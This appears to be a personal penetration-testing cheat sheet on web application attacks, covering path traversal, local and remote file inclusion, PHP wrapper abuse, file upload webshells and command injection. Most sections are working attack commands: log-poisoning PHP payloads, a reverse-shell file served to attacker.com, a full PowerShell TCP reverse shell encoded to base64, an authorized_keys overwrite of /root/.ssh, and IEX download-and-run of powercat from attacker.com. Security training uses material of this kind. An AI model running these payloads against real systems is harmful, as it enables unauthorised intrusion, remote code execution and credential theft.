
# Common Attacks towards Web Applications

Important! [OWASP Web Application Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/README)

## Directory Traversal

* Test if path traversal is possible
* Windows `C:\Windows\System32\drivers\etc\hosts`
* Linux `/etc/passwd`

Curl

* --path-as-is for ../
* Windows LFI without C:

```bash
curl --path-as-is http://target-URL/public/../../../../../../../../WINDOWS/System32/drivers/etc/hosts
curl --path-as-is http://target-URL/public/../../../../../../../../etc/passwd
```

Intruder Payload

```bash
# single url %2e%2e%2f 
# double url %252e%252e%252f 
res=" "; pattern="../"; for i in {1..10}; do res=$res$pattern; echo $res; done
```

On Windows system, try to read `C:/WINDOWS/System32/drivers/etc/hosts` file first to test for path traversal. Next try to read files of the identified web server and it's configuration file or logs. Try to find sensitive information like username or passwords.

In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of `/etc/passwd`, check for private keys in their home directory `/home/user/.ssh/id_rsa`, and use them to access the system via SSH.

## Local File Inclusion

The big difference between path traversal and file inclusion (LI) is that LI allows to **execute files** where path traversal only allows to read them. The **code execution** is major attack vector.

Linux Web Servers

* PATH `/var/www/html/login.html.`
* URLs `https://example.com/login.html`
* POIs `https://example.com/cms/login.php?page=en.html`
  * subfolder cms
  * PHP language
  * file inclusion

Windows Web Server

* [LFI](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e)
* [IIS Log Management](https://learn.microsoft.com/en-us/iis/manage/provisioning-and-managing-iis/managing-iis-log-file-storage)
* ISS Conf `\inetpub\wwwroot\web.config`
* ISS Logs `\inetpub\logs\LogFiles\W3SVC1\u_ex[YYMMDD].log`
* Apache Conf `/xampp/apache/conf/httpd.conf`
* Apache Logs `/xampp/apache/logs/access.log`
* Apache Logs `/xampp/apache/logs/error.log`
* Sensitive information: user, passwords

The goal of an LFI exploit is to load/include poisoned files with a interpreter to execute code. Log file poisoning allows the attacker to put malicious code written in e.g. PHP/python/ASP/JSP/perl/JS into a log file which gets executed by attacked website. The basic attack vector is the `system` call to execute arbitrary code using URL or POST data payload. (RCE)

More info about webshell can be found here `kali ll /usr/share/webshells/php/`

Example:

* Navigate to `https://example.com/index.php?page=admin.php`
* Include local log file `../../xampp/apache/logs/access.log`
* Identify that controlled User Agent gets logged `Mozilla/5.0`
* Trigger log poisoning with curl -A "user-agent-name-here" e.g. `<?php echo system($_GET['cmd']); ?>`
* Include log file to execute cmd `../../xampp/apache/logs/access.log?cmd=id`

```bash
curl -i -k https://example.com/index.php?page=../../../../../../../../../xampp/apache/logs/access.log
# code allows to run a simple command supplied by the URL (encoding)
curl -i -A "Mozilla/5.2 <?php echo system($_GET['cmd']); ?>"
curl -i -k https://example.com/index.php?page=../../../../../../../../../xampp/apache/logs/access.log&cmd=ps
```

## Remote File Inclusion

* Requires allow_url_include `https://www.php.net/manual/en/filesystem.configuration.php`
* Requires an interpretet language
* See `/usr/share/webshells`

Remote file inclusion (RFI) works like that LFI but has security misconfiguration as precondition. Given the PHP setting `allow_url_include` is active, an attacker can host the include file remotely. It can use a HTTP server to do so and wait for an reverse shell

Example:

* Navigate to `/usr/share/webshells`
* Setup HTTP server `python -m simple.http 80`
* Setup TCP listener (NC reverse shell)
* Navigate to `https://example.com/index.php?page=admin.php`
* Include the remote file `page=http://attacker.com/php-reverse-shell.php`
* Use newly spawned reverse shell on TCP listener

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/
sed -i "s/$ip = '127.0.0.1'/$ip = 'attacker.com'/g" php-reverse-shell.php
sed -i "s/$port = 1234/$port = 4444/g" php-reverse-shell.php
python -m simple.http 80
nc -nlvp 4444
curl -k -i https://example.com/index.php?page=http://attacker.com/php-reverse-shell.php
```

## Read Filter and Data Execution

* Requires allow_url_include `https://www.php.net/manual/en/filesystem.configuration.php`
* PHP Read File Filter `https://www.php.net/manual/en/wrappers.php.php`
* PHP Data Execution `https://www.php.net/manual/en/wrappers.data.php`

```bash
# Read File content in Base64 format with php://filter
curl http://example.com/index.php?page=php://filter/resource=admin.php
curl http://example.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php
# Execute Cmd with php://data from
curl "http://example.com/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://example.com/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

## File Upload Vulnerability

* Find file uploads in the app (images, texts, doc)
* Identify programming language
* Identify if block list or filters can be bypassed
* Try to upload a webshell `/usr/share/webshells`
* Identify underlying OS
* Setup a TCP listener `nc -nlvp 4444`
* Prepare reverse shell e.g. PS `https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3`
* Use the installed webshell and `powershell -enc` to run a base64 encoded reverse shell exploit

```powershell
# Install a PHP webshell
cp /usr/share/webshells/php/simple-backdoor.php ~/simple-backdoor.Php
curl -i -F "fileToUpload=@./simple-backdoor.Php" http://target.com/meteor/upload.php
curl -i http://target.com/meteor/uploads/simple-backdoor.Php?cmd=whoami
# Prepare PS reverse shell
pwsh
$Shell = '$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
# Encode utf-8 and convert to base 64 
$Base64Shell = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Shell))
# Exploit
nc -nlvp 4444
curl http://target.com/meteor/uploads/simple-backdoor.Php?cmd=powershell%20-enc%20$Base64Shell
...

## File Upload with Path Traversal (but no execution)

* A Linux standard vector is to use SSH key for access
* Combine Path Traversal and File Upload vulnerability
* Upload `authorized_keys` blindly to `/root/.ssh` folder

```bash
# Generate new SSH key
ssh-keygen
cat new-key.pub > authorized_keys
# POST authorized_keys via unprotected upload form and exploit path traversal in filename to override the file into root folder
curl -i -F 'myFile=@./authorized_keys;filename=../../../../../../../../../../root/.ssh/authorized_keys' http://target.com/upload
ssh -i new-key root@target.com
```

## Command Injection

* [OWASP Test for Command Injections](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection)
* Shell command seperator %3B = ';'
* e.g. ipconfig;nc attacker.com 4444
* e.g. ";ls #

Test if we run on 'cmd' or 'powershell'

```shell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell 
# URL encode with BURP
%3B%28%64%69%72%20%32%3e%26%31%20%2a%60%7c%65%63%68%6f%20%43%4d%44%29%3b%26%3c%23%20%72%65%6d%20%23%3e%65%63%68%6f%20%50%6f%77%65%72%53%68%65%6c%6c%20
```

Serve Powercat

* NC tool for pwsh `https://github.com/besimorhino/powercat`
* -c IP to connect
* -p Port to connect
* -e executeable to run
* -ep execute Powershell

```bash
# serve via local machine
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
nc -nlvp 4444
```

Download Powercat and spawn Reverse Shell

```powershell
# download from github 
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
# download from attacker machine
IEX (New-Object System.Net.Webclient).DownloadString("http://attacker.com/powercat.ps1")
# run PS reverse shell 
powercat -c attacker.com -p 4444 -ep
# another PS version 1.0 reverse shell
https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1
```
